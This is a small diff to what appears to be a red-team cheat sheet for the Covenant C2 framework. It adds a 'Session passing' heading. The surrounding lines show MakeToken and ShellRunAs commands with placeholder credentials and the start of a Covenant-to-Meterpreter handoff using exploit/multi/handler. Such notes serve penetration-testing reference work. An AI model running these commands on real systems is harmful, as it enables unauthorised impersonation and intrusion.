@@ -104,7 +104,7 @@ MakeToken /username:"<USER>" /domain:"<DOMAIN>" /password:"<PASSWORD>" /logontyp
 ShellRunAs /shellcommand:"whoami" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
 ```
 
-
+### Session passing
 #### Covenant --> Meterpreter
 ```
 use exploit/multi/handler
